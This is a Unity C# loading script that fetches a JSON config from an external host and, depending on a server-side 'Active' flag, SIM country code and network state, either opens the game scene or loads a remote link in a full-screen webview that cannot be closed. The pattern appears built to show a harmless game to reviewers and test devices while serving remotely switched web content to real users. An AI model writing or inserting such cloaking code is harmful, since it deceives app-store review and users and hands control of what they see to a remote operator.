using UnityEngine.Networking;
using System.Collections;
using UnityEngine;

public class Loading : MonoBehaviour
{
    private const string url = "https://vivada.pw/asdq.json";
    private UniWebView View { get; set; }

    private void Start()
    {
        CacheComponents();

        var noNetwork = Application.internetReachability == NetworkReachability.NotReachable;
        if (noNetwork || SimUtility.GetTwoSmallLetterCountryCodeISO().Length == 0)
        {
            Screen.orientation = ScreenOrientation.Portrait;
            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
            return;
        }

        var bodyString = PrefsUtility.GetBodyString();
        if (bodyString == null)
        {
            StartCoroutine(nameof(Get_First_Request));
        }
        else
        {
            InitWebView();
        }
    }

    IEnumerator Get_First_Request()
    {
        UnityWebRequest webRequest = UnityWebRequest.Get(url);
        yield return webRequest.SendWebRequest();

        var bodyString = webRequest.downloadHandler.text;
        var bodyObject = JsonUtility.FromJson<BodyObject>(bodyString);

        if(!bodyObject.Active)
        {
            Screen.orientation = ScreenOrientation.Portrait;
            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
            yield break;
        }

        PrefsUtility.SetBodyString(bodyString);
        InitWebView();
    }

    void CacheComponents()
    {
        View = gameObject.AddComponent<UniWebView>();
        Camera.main.backgroundColor = Color.black;

        View.ReferenceRectTransform = GameObject.Find("rect").GetComponent<RectTransform>();

        var safeArea = Screen.safeArea;
        var anchorMin = safeArea.position;
        var anchorMax = anchorMin + safeArea.size;

        anchorMin.x /= Screen.width;
        anchorMin.y /= Screen.height;
        anchorMax.x /= Screen.width;
        anchorMax.y /= Screen.height;

        View.ReferenceRectTransform.anchorMin = anchorMin;
        View.ReferenceRectTransform.anchorMax = anchorMax;

        View.SetShowSpinnerWhileLoading(false);
        View.BackgroundColor = Color.white;

        View.OnOrientationChanged += (v, o) =>
        {
            Screen.fullScreen = o == ScreenOrientation.Landscape;

            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            v.ReferenceRectTransform.anchorMin = anchorMin;
            v.ReferenceRectTransform.anchorMax = anchorMax;

            View.UpdateFrame();
        };

        View.OnShouldClose += (v) =>
        {
            return false;
        };

        View.OnPageStarted += (browser, url) =>
        {
            var safeArea = Screen.safeArea;
            var anchorMin = safeArea.position;
            var anchorMax = anchorMin + safeArea.size;

            anchorMin.x /= Screen.width;
            anchorMin.y /= Screen.height;
            anchorMax.x /= Screen.width;
            anchorMax.y /= Screen.height;

            View.ReferenceRectTransform.anchorMin = anchorMin;
            View.ReferenceRectTransform.anchorMax = anchorMax;

            View.UpdateFrame();
        };

        View.OnPageFinished += (browser, code, url) =>
        {
            if(url == JsonUtility.FromJson<BodyObject>(PrefsUtility.GetBodyString()).Link)
            {
                Screen.orientation = ScreenOrientation.Portrait;
                UnityEngine.SceneManagement.SceneManager.LoadScene(1);
                return;
            }

            View.Show();
        };
    }

    void InitWebView()
    {
        foreach(Transform t in View.ReferenceRectTransform)
        {
            Destroy(t.gameObject);
        }

        Screen.orientation = ScreenOrientation.AutoRotation;
        var target = JsonUtility.FromJson<BodyObject>(PrefsUtility.GetBodyString()).Link;
        View.Load(target);
    }
}
